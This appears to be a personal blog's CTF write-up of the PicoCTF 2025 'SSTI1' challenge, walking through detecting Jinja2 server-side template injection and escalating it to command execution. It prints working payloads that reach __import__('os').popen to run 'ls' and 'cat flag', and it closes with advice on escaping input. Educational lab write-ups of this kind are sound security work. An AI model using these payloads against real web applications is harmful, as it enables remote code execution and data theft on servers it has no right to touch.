<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PicoCTF 2025 - SSTI1 - Writeup | Denis Wambold</title>
  <meta name="description" content="Writeup for the SSTI1 challenge from PicoCTF 2025">
  <link rel="icon" href="/favicon.ico">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <header>
    <div class="container">
      <a href="/" class="site-title">Denis Wambold</a>
      <nav>
        <a href="/">home</a>
        <a href="/writeups/">writeups</a>
        <a href="/projects/">projects</a>
        <a href="/blog/">blog</a>
        <button class="theme-toggle" aria-label="Toggle theme">
          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
        </button>
      </nav>
    </div>
  </header>

  <main>
    <div class="container">
      <article>
        <header class="article-header">
          <h1>CTF Writeup: SSTI1 (PicoCTF 2025)</h1>
          <span class="article-meta">Aug 15, 2025</span>
        </header>

        <div class="article-content">
          <p>This challenge presents a simple website where users can submit an announcement, which then gets displayed back to them. Looks pretty innocent.</p>

          <hr>

          <h2>Step 1: Inspect the Website</h2>

          <p>The page looks like this:</p>

          <img src="landing_page.png" alt="Website Screenshot">
          <img src="example_input.png" alt="Form Screenshot">
          <img src="example.png" alt="Output Screenshot">

          <p>The frontend HTML is straightforward:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;&lt;title&gt;SSTI1&lt;/title&gt;&lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt; Home &lt;/h1&gt;
    &lt;p&gt;I built a cool website that lets you announce whatever you want!* &lt;/p&gt;
    &lt;form action="/" method="POST"&gt;
      What do you want to announce: &lt;input name="content" id="announce"&gt;
      &lt;button type="submit"&gt; Ok &lt;/button&gt;
    &lt;/form&gt;
    &lt;p style="font-size:10px;position:fixed;bottom:10px;left:10px;"&gt;
      *Announcements may only reach yourself
    &lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

          <ul>
            <li>No extra parameters in the request.</li>
            <li>No hidden scripts or suspicious endpoints.</li>
            <li>Just a text input reflected back on the page.</li>
          </ul>

          <p>So the vulnerability must be in how this input is processed.</p>

          <hr>

          <h2>Step 2: Hypotheses</h2>

          <p>When user input is echoed back, a few classic vulnerabilities come to mind:</p>

          <ol>
            <li><strong>XSS (Cross-Site Scripting)</strong> &rarr; Would run malicious JavaScript in the browser, but that affects only the client side.</li>
            <li><strong>SQL Injection</strong> &rarr; Doesn't make sense here, since we aren't interacting with a database.</li>
            <li><strong>SSTI (Server-Side Template Injection)</strong> &rarr; Happens when user input is directly passed into a template engine (like Latex, Jinja2, Smarty, Twig, etc.) and rendered as code.</li>
          </ol>

          <p>Given the challenge title, option (3) is the clear candidate. I have done this once with Latex and forced it to execute a command. Maybe this will be similar.</p>

          <hr>

          <h2>Step 3: Testing for Jinja2</h2>

          <p>We have to start with a framework. Jinja2 is the most common template engine for Python (I would say), so we will start with that. A common way to test for Jinja2 is to inject a simple expression:</p>

          <pre><code>{{ 5*5 }}</code></pre>

          <p>If the output renders as <code>25</code>, the input is being evaluated inside a Jinja2 template.</p>

          <p><strong>Bingo!</strong> The expression evaluates, confirming a Jinja2 SSTI.</p>

          <img src="25.png" alt="Payload Success">

          <hr>

          <h2>Step 4: Exploring the Template Context</h2>

          <p>With SSTI confirmed, the next step is to explore what's available in the rendering context. One useful trick is to look at the template's global python variables:</p>

          <pre><code>{{ self.__init__.__globals__ }}</code></pre>

          <p>The app outputs something like:</p>

<pre><code># {'__name__': 'jinja2.runtime', '__doc__': 'The runtime functions and state used by compiled templates.', ...
'__builtins__': {...}, 'Macro': &lt;class 'jinja2.runtime.Macro'&gt;, ... }</code></pre>

          <p>This reveals access to Python internals, including <code>__builtins__</code>. That's huge, because from here, we can call dangerous functions like <code>__import__</code>.</p>

          <hr>

          <h2>Step 5: Arbitrary Code Execution</h2>

          <p>Once we have <code>__import__</code>, it's game over. We can import Python's <code>os</code> module and execute system commands:</p>

          <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}</code></pre>

          <p>This executes <code>ls</code> on the server and returns the directory contents.</p>

          <img src="ls.png" alt="Shell Access">

          <p>Reading the flag is just as simple:</p>

          <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}</code></pre>

          <p>There we go! We got the flag.</p>

          <img src="flag.png" alt="Flag Output">

          <hr>

          <h2>Step 6: Lessons Learned</h2>

          <p>This challenge demonstrates the danger of <strong>mixing data and code</strong>.</p>

          <ul>
            <li>User input must never be directly passed into a template without escaping.</li>
            <li>In Jinja2 and basically <strong>everywhere</strong>, the correct way to safely display user input is to <strong>escape it</strong>, ensuring that it's treated purely as text rather than executable code.</li>
          </ul>

          <hr>

          <h2>Final Thoughts</h2>

          <p>What started as a plain input field turned into full server compromise with just a few payloads. <strong>Sanitize input</strong> and <strong>separate logic from presentation</strong>!</p>

          <p>SSTI vulnerabilities might not be as well-known as XSS or SQL injections, but they're just as dangerous. Especially, since they are less known.</p>
        </div>
      </article>
    </div>
  </main>

  <footer>
    <div class="container">
      <div class="social-links">
        <a href="https://x.com/wambosec" target="_blank" title="X"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
        <a href="https://github.com/wambodns" target="_blank" title="GitHub"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg></a>
        <a href="https://linkedin.com/in/denis-wambold-445925234" target="_blank" title="LinkedIn"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
        <a href="https://scholar.google.com/citations?user=eLgxI6IAAAAJ" target="_blank" title="Google Scholar"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M11.7 2.805a.75.75 0 0 1 .6 0A60.65 60.65 0 0 1 22.83 8.72a.75.75 0 0 1-.231 1.337 49.948 49.948 0 0 0-9.902 3.912l-.003.002c-.114.06-.227.119-.34.18a.75.75 0 0 1-.707 0A50.88 50.88 0 0 0 7.5 12.173v-.224c0-.131.067-.248.172-.311a54.615 54.615 0 0 1 4.653-2.52.75.75 0 0 0-.65-1.352 56.123 56.123 0 0 0-4.78 2.589 1.858 1.858 0 0 0-.859 1.228 49.803 49.803 0 0 0-4.634-1.527.75.75 0 0 1-.231-1.337A60.653 60.653 0 0 1 11.7 2.805Z"/><path d="M13.06 15.473a48.45 48.45 0 0 1 7.666-3.282c.134 1.414.22 2.843.255 4.284a.75.75 0 0 1-.46.711 47.87 47.87 0 0 0-8.105 4.342.75.75 0 0 1-.832 0 47.87 47.87 0 0 0-8.104-4.342.75.75 0 0 1-.461-.71c.035-1.442.121-2.87.255-4.286.921.304 1.83.634 2.726.99v1.27a1.5 1.5 0 0 0-.14 2.508c-.09.38-.222.753-.397 1.11.452.213.901.434 1.346.66a6.727 6.727 0 0 0 .551-1.607 1.5 1.5 0 0 0 .14-2.67v-.645a48.549 48.549 0 0 1 3.44 1.667 2.25 2.25 0 0 0 2.12 0Z"/><path d="M4.462 19.462c.42-.419.753-.89 1-1.395.453.214.902.435 1.347.662a6.742 6.742 0 0 1-1.286 1.794.75.75 0 0 1-1.06-1.06Z"/></svg></a>
      </div>
      <span>&copy; 2026 Denis Wambold</span>
    </div>
  </footer>
  <script>
    const toggle = document.querySelector('.theme-toggle');
    const html = document.documentElement;
    const stored = localStorage.getItem('theme');
    if (stored) html.setAttribute('data-theme', stored);
    else if (window.matchMedia('(prefers-color-scheme: light)').matches) html.setAttribute('data-theme', 'light');
    else html.setAttribute('data-theme', 'dark');
    toggle.addEventListener('click', () => {
      const isDark = html.getAttribute('data-theme') === 'dark';
      const newTheme = isDark ? 'light' : 'dark';
      html.setAttribute('data-theme', newTheme);
      localStorage.setItem('theme', newTheme);
    });
  </script>
</body>
</html>
